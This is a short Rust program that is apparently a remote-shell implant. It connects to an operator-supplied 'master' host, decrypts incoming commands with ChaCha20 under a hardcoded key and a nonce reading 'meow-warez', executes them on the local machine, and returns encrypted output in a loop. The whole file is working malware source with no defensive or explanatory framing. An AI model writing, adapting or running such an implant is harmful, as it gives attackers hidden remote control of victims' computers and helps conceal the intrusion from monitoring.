extern crate clap;
extern crate chacha20;

use std::io::{Read, Write};
use clap::Parser;
use std::net::TcpStream;
use std::process::{Command,Stdio};

use chacha20::ChaCha20;
use chacha20::cipher::{StreamCipher,KeyIvInit};

#[derive(Parser, Debug)]
#[command(version, about, long_about = None)]
struct Args {
	#[arg(short, long)]
	master: String
}

fn main() {
	//get the arguments
	let args = Args::parse();

	//generate the encryption
	let seed = [250, 205, 247, 69, 141, 132, 131, 178, 20, 25, 122, 114, 69, 170, 212, 92, 79, 242, 151, 228, 185, 2, 147, 2, 114, 52, 227, 195, 93, 234, 144, 105];
	let nonce = [109, 101, 111, 119, 45, 119, 97, 114, 101, 122, 58, 51];
	let mut cipher = ChaCha20::new(&seed.into(), &nonce.into());

	//connect
	let mut stream = TcpStream::connect(args.master).expect("error connecting");

	//start the client loop
	loop {
		//get the number of bytes in the message
		let mut to_read_b = [0; 4];
		stream.read_exact(&mut to_read_b).expect("read failure");
		let to_read = u32::from_be_bytes(to_read_b) as usize;

		//read this amount of bytes from the server
		//then decrypt it
		let mut payload: Vec<u8> = vec![0; to_read];
		stream.read_exact(&mut payload).expect("read failure");
		cipher.apply_keystream(&mut payload);

		//convert to a string, then split it by spaces
		let payl = String::from_utf8_lossy(&payload);
		let lines = payl.split(" ").collect::<Vec<_>>();

		//if we're quitting, stop
		println!("receive command: {} {:?}", payl, payload);
		if payl == "exit" {
			break;
		}

		//build the command
		let args = &lines[1..lines.len()];
		let cmd = Command::new(&lines[0]).args(args).stdout(Stdio::piped()).output().expect("command error");

		//send it back to the server
		//first send back the number
		let mut output = cmd.stdout.clone();
		let size = (output.len() as u32).to_be_bytes();
		stream.write_all(&size).expect("send failure");

		//then, send back the output
		cipher.apply_keystream(&mut output);
		stream.write_all(&output).expect("send failure");
	}
}